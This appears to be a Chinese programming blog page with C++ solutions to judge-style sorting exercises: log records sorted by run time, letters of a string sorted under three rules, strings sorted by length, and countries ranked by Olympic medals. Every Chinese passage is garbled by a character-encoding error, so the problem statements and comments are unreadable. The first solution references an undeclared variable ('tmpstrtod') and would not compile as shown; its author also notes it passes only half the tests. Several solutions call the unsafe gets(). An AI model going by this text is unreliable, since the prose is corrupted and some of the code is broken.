æ—¶é—´æ¶ˆè€—å°‘çš„è®¡ç®—ä»»åŠ¡æ’åœ¨å‰é¢ï¼Œæ—¶é—´æ¶ˆè€—å¤šçš„è®¡ç®—ä»»åŠ¡æ’åœ¨åé¢ã€‚ å¦‚æœä¸¤ä¸ªè®¡ç®—ä»»åŠ¡æ¶ˆè€—çš„æ—¶é—´ç›¸åŒï¼Œåˆ™å°†å¼€å§‹æ‰§è¡Œæ—¶é—´æ—©çš„è®¡ç®—ä»»åŠ¡æ’åœ¨å‰é¢ã€‚</p><h6 id="è¾“å…¥æè¿°"><a href="#è¾“å…¥æè¿°" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—ä¸­æ¯ä¸ªè®°å½•æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦ä¸²å ä¸€è¡Œã€‚æœ€åä¸€è¡Œä¸ºç©ºè¡Œï¼Œè¡¨ç¤ºæ—¥å¿—ç»“æŸã€‚æ—¥å¿—ä¸­æœ€å¤šå¯èƒ½æœ‰<span class="number">10000</span>æ¡è®°å½•ã€‚</span><br><span class="line">è®¡ç®—ä»»åŠ¡åç§°çš„é•¿åº¦ä¸è¶…è¿‡<span class="number">10</span>ï¼Œå¼€å§‹æ‰§è¡Œæ—¶é—´çš„æ ¼å¼æ˜¯YYYY-MM-<span class="built_in">DD</span> HH:MM:<span class="built_in">SS</span>,MMMï¼Œæ¶ˆè€—æ—¶é—´å°æ•°ç‚¹åæœ‰ä¸‰ä½æ•°å­—ã€‚</span><br><span class="line">è®¡ç®—ä»»åŠ¡åç§°ä¸ä»»åŠ¡å¼€å§‹æ—¶é—´ã€æ¶ˆè€—æ—¶é—´ä¹‹é—´ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼éš”å¼€ï¼Œè¡Œé¦–å’Œè¡Œå°¾å¯èƒ½æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°"><a href="#è¾“å‡ºæè¿°" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ’åºå¥½çš„æ—¥å¿—è®°å½•ã€‚æ¯ä¸ªè®°å½•çš„å­—ç¬¦ä¸²å„å ä¸€è¡Œã€‚</span><br><span class="line">è¾“å…¥çš„æ ¼å¼ä¸è¾“å…¥ä¿æŒä¸€è‡´ï¼Œè¾“å…¥åŒ…æ‹¬å‡ ä¸ªç©ºæ ¼ï¼Œä½ çš„è¾“å‡ºä¸­ä¹Ÿåº”è¯¥åŒ…å«åŒæ ·å¤šçš„ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><p>è¯»å…¥æ•°æ®çš„æ ¼å¼åŒ–å¤„ç†ï¼Œå­¦åˆ°äº†ä»¥ä¸‹å‡ ä¸ªä¸œè¥¿ï¼š</p><ol><li>stringä¹Ÿèƒ½è¿›è¡Œç›´æ¥æ¯”è¾ƒï¼Œchar * å¯ä»¥ç”¨strcmpæ¯”è¾ƒ</li><li>substr åˆ†å‰²string</li><li>strtodæŠŠchar * å˜æˆæµ®ç‚¹æ•°</li><li>stringä¸­æ•°å­—æ¯”è¾ƒä¼šéº»çƒ¦ä¸€äº›ï¼Œæ¯”å¦‚â€40â€ &gt; â€œ350â€ï¼Œä½†æ˜¯40 &lt; 350.</li></ol><p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥åªè¿‡äº†ä¸€åŠï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span>&#123;</span></span><br><span class="line">string name; </span><br><span class="line">string t;</span><br><span class="line">string rt;</span><br><span class="line"><span class="keyword">float</span> rt_;</span><br><span class="line">&#125;tk[<span class="number">10000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(struct task a, struct task b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.rt_ == b.rt_) <span class="keyword">return</span> a.t &lt; b.t;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a.rt_ &lt; b.rt_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">getline</span>(cin, s))&#123;</span><br><span class="line"><span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = len<span class="number">-1</span>; j &gt; <span class="number">0</span>; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j] != <span class="string">&#x27; &#x27;</span>&amp;&amp; s[j<span class="number">-1</span>] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">tk[cnt].rt = s.<span class="built_in">substr</span>(j, len-j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> l2 = tk[cnt].rt.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(tmp, tk[cnt].rt.<span class="built_in">substr</span>(<span class="number">0</span>, l2<span class="number">-3</span>).<span class="built_in">c_str</span>());</span><br><span class="line">tk[cnt].rt_ = <span class="built_in">strtod</span>(tmpstrtod, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; j; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27; &#x27;</span> &amp;&amp; s[i+<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">tk[cnt].name = s.<span class="built_in">substr</span>(<span class="number">0</span>, i+<span class="number">1</span>);;</span><br><span class="line">tk[cnt].t = s.<span class="built_in">substr</span>(i+<span class="number">1</span>, j-i<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cnt ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(tk, tk+cnt, compare);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">cout &lt;&lt; tk[i].name &lt;&lt; tk[i].t &lt;&lt; tk[i].rt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ’åº2"><a href="#å­—ç¬¦ä¸²æ’åº2" class="headerlink" title="å­—ç¬¦ä¸²æ’åº2"></a>å­—ç¬¦ä¸²æ’åº2</h3><p>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œå°†è¾“å…¥å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æŒ‰å¦‚ä¸‹è§„åˆ™æ’åº(ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹å¯èƒ½åŒ…å«å¤šç»„æ•°æ®ï¼Œè¯·æ³¨æ„å¤„ç†)ã€‚</p><p>è§„åˆ™ 1 ï¼šè‹±æ–‡å­—æ¯ä» A åˆ° Z æ’åˆ—ï¼Œä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>å¦‚ï¼Œè¾“å…¥ï¼š <strong>Type</strong> è¾“å‡ºï¼š <strong>epTy</strong></p><p>è§„åˆ™ 2 ï¼šåŒä¸€ä¸ªè‹±æ–‡å­—æ¯çš„å¤§å°å†™åŒæ—¶å­˜åœ¨æ—¶ï¼ŒæŒ‰ç…§è¾“å…¥é¡ºåºæ’åˆ—ã€‚</p><p>å¦‚ï¼Œè¾“å…¥ï¼š <strong>BabA</strong> è¾“å‡ºï¼š <strong>aABb</strong></p><p>è§„åˆ™ 3 ï¼šéè‹±æ–‡å­—æ¯çš„å…¶å®ƒå­—ç¬¦ä¿æŒåŸæ¥çš„ä½ç½®ã€‚</p><p>å¦‚ï¼Œè¾“å…¥ï¼š <strong>By?e</strong> è¾“å‡ºï¼š <strong>Be?y</strong></p><p>æ ·ä¾‹ï¼š</p><p>è¾“å…¥ï¼š</p><p>A Famous Saying: Much Ado About Nothing(2012/8).</p><p>è¾“å‡ºï¼š</p><p>A aaAAbc dFgghh : iimM nNn oooos Sttuuuy (2012/8).</p><p>æ€è·¯ï¼šå­—æ¯å•ç‹¬å­˜èµ·æ¥ï¼ˆè§„åˆ™ä¸‰ï¼‰ï¼Œç„¶åæŒ‰å­—æ¯è¡¨æ’åºï¼ˆcmpï¼‰ï¼Œå¤§å°å†™æŒ‰ç…§è¾“å…¥é¡ºåºæ’å³éœ€è¦ç¨³ç‚¹æ’åºï¼ˆstable_sortï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">char</span> a, <span class="keyword">char</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">islower</span>(a) &amp;&amp; <span class="built_in">islower</span>(b)) || (<span class="built_in">isupper</span>(a) &amp;&amp; <span class="built_in">isupper</span>(b))) <span class="keyword">return</span> a &lt; b;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">tolower</span>(a) != <span class="built_in">tolower</span>(b)) <span class="keyword">return</span> <span class="built_in">tolower</span>(a) &lt; <span class="built_in">tolower</span>(b);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">gets</span>(s))&#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">char</span> s_[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i])) s_[idx++] = s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">stable_sort</span>(s_, s_+idx, cmp);</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i])) s[i] = s_[idx++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ’åº3"><a href="#å­—ç¬¦ä¸²æ’åº3" class="headerlink" title="å­—ç¬¦ä¸²æ’åº3"></a>å­—ç¬¦ä¸²æ’åº3</h3><h5 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å…ˆè¾“å…¥ä½ è¦è¾“å…¥çš„å­—ç¬¦ä¸²çš„ä¸ªæ•°ã€‚ç„¶åæ¢è¡Œè¾“å…¥è¯¥ç»„å­—ç¬¦ä¸²ã€‚æ¯ä¸ªå­—ç¬¦ä¸²ä»¥å›è½¦ç»“æŸï¼Œæ¯ä¸ªå­—ç¬¦ä¸²å°‘äºä¸€ç™¾ä¸ªå­—ç¬¦ã€‚ å¦‚æœåœ¨è¾“å…¥è¿‡ç¨‹ä¸­è¾“å…¥çš„ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºâ€œstopâ€ï¼Œä¹Ÿç»“æŸè¾“å…¥ã€‚ ç„¶åå°†è¿™è¾“å…¥çš„è¯¥ç»„å­—ç¬¦ä¸²æŒ‰æ¯ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç”±å°åˆ°å¤§æ’åºï¼ŒæŒ‰æ’åºç»“æœè¾“å‡ºå­—ç¬¦ä¸²ã€‚</p><h6 id="è¾“å…¥æè¿°-1"><a href="#è¾“å…¥æè¿°-1" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ä¸²çš„ä¸ªæ•°ï¼Œä»¥åŠè¯¥ç»„å­—ç¬¦ä¸²ã€‚æ¯ä¸ªå­—ç¬¦ä¸²ä»¥â€˜\nâ€™ç»“æŸã€‚å¦‚æœè¾“å…¥å­—ç¬¦ä¸²ä¸ºâ€œstopâ€ï¼Œä¹Ÿç»“æŸè¾“å…¥.</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-1"><a href="#è¾“å‡ºæè¿°-1" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½æœ‰å¤šç»„æµ‹è¯•æ•°æ®ï¼Œå¯¹äºæ¯ç»„æ•°æ®ï¼Œ</span><br><span class="line">å°†è¾“å…¥çš„æ‰€æœ‰å­—ç¬¦ä¸²æŒ‰é•¿åº¦ç”±å°åˆ°å¤§æ’åºè¾“å‡º(å¦‚æœæœ‰â€œstopâ€ï¼Œä¸è¾“å‡ºâ€œstopâ€)ã€‚</span><br><span class="line"></span><br><span class="line">æ ¹æ®è¾“å…¥çš„å­—ç¬¦ä¸²ä¸ªæ•°æ¥åŠ¨æ€åˆ†é…å­˜å‚¨ç©ºé—´ï¼ˆé‡‡ç”¨<span class="keyword">new</span>()å‡½æ•°ï¼‰ã€‚æ¯ä¸ªå­—ç¬¦ä¸²ä¼šå°‘äº<span class="number">100</span>ä¸ªå­—ç¬¦ã€‚</span><br><span class="line">æµ‹è¯•æ•°æ®æœ‰å¤šç»„ï¼Œæ³¨æ„ä½¿ç”¨<span class="keyword">while</span>()å¾ªç¯è¾“å…¥ã€‚</span><br></pre></td></tr></table></figure><p>myï¼šcinä¹‹åä¼šåœ¨ç¼“å†²åŒºå‰©ä¸€ä¸ª\nï¼Œå¦‚æœå†ä½¿ç”¨è¯»å–ä¸€è¡Œçš„å‡½æ•°è¯»å–ä¼šæŠŠ\nè¯»è¿›å»ï¼Œå¾—ç”¨cin.ignore()</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span>&#123;</span></span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(struct st a, struct st b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.len &lt; b.len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">cin.<span class="built_in">ignore</span>();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span> <span class="title">s</span>[<span class="title">n</span>];</span></span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">gets</span>(tmp);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(tmp, <span class="string">&quot;stop&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s[i].s = tmp;</span><br><span class="line">s[i].len = s[i].s.<span class="built_in">size</span>();</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(s, s+cnt, cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">cout &lt;&lt; s[i].s &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="å¥¥è¿æ’åºé—®é¢˜"><a href="#å¥¥è¿æ’åºé—®é¢˜" class="headerlink" title="å¥¥è¿æ’åºé—®é¢˜"></a>å¥¥è¿æ’åºé—®é¢˜</h3><h5 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æŒ‰è¦æ±‚ï¼Œç»™å›½å®¶è¿›è¡Œæ’åã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-2"><a href="#è¾“å…¥æè¿°-2" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æœ‰å¤šç»„æ•°æ®ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œç»™å‡ºå›½å®¶æ•°<span class="built_in">N</span>ï¼Œè¦æ±‚æ’åçš„å›½å®¶æ•°Mï¼Œå›½å®¶å·ä»<span class="number">0</span>åˆ°<span class="built_in">N</span>-<span class="number">1</span>ã€‚</span><br><span class="line">ç¬¬äºŒè¡Œå¼€å§‹çš„<span class="built_in">N</span>è¡Œç»™å®šå›½å®¶æˆ–åœ°åŒºçš„å¥¥è¿é‡‘ç‰Œæ•°ï¼Œå¥–ç‰Œæ•°ï¼Œäººå£æ•°ï¼ˆç™¾ä¸‡ï¼‰ã€‚</span><br><span class="line">æ¥ä¸‹æ¥ä¸€è¡Œç»™å‡ºMä¸ªå›½å®¶å·ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-2"><a href="#è¾“å‡ºæè¿°-2" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ’åºæœ‰<span class="number">4</span>ç§æ–¹å¼: é‡‘ç‰Œæ€»æ•° å¥–ç‰Œæ€»æ•° é‡‘ç‰Œäººå£æ¯”ä¾‹ å¥–ç‰Œäººå£æ¯”ä¾‹ </span><br><span class="line">å¯¹æ¯ä¸ªå›½å®¶ç»™å‡ºæœ€ä½³æ’åæ’åæ–¹å¼ å’Œ æœ€ç»ˆæ’å</span><br><span class="line">æ ¼å¼ä¸º: æ’å:æ’åæ–¹å¼</span><br><span class="line">å¦‚æœæœ‰ç›¸åŒçš„æœ€ç»ˆæ’åï¼Œåˆ™è¾“å‡ºæ’åæ–¹å¼æœ€å°çš„é‚£ç§æ’åï¼Œå¯¹äºæ’åæ–¹å¼ï¼Œé‡‘ç‰Œæ€»æ•° &lt; å¥–ç‰Œæ€»æ•° &lt; é‡‘ç‰Œäººå£æ¯”ä¾‹ &lt; å¥–ç‰Œäººå£æ¯”ä¾‹ </span><br><span class="line">å¦‚æœæœ‰å¹¶åˆ—æ’åçš„æƒ…å†µï¼Œå³å¦‚æœå‡ºç°é‡‘ç‰Œæ€»æ•°ä¸º <span class="number">100,90,90,80</span>.åˆ™æ’åä¸º<span class="number">1,2,2,4</span>.</span><br><span class="line">æ¯ç»„æ•°æ®ååŠ ä¸€ä¸ªç©ºè¡Œã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘çš„æ–¹æ³•æ˜¯ç”¨ç»“æ„ä½“å®šä¹‰è¿™å››ç§æ’åçš„å‚æ•°ï¼Œidå’Œrkä¹Ÿéœ€è¦åœ¨é‡Œé¢ï¼Œæœ€åæ ¹æ®idåœ¨sortä¸€éã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">country</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">double</span> gold_num;</span><br><span class="line"><span class="keyword">double</span> prize_num;</span><br><span class="line"><span class="keyword">double</span> gold_per_person;</span><br><span class="line"><span class="keyword">double</span> prize_per_person;</span><br><span class="line"><span class="keyword">int</span> rk[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp0</span><span class="params">(struct country a, struct country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.id &lt; b.id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp1</span><span class="params">(struct country a, struct country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.gold_num &gt; b.gold_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp2</span><span class="params">(struct country a, struct country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.prize_num &gt; b.prize_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp3</span><span class="params">(struct country a, struct country b)</span></span>&#123;</span><br><span class="line"><span 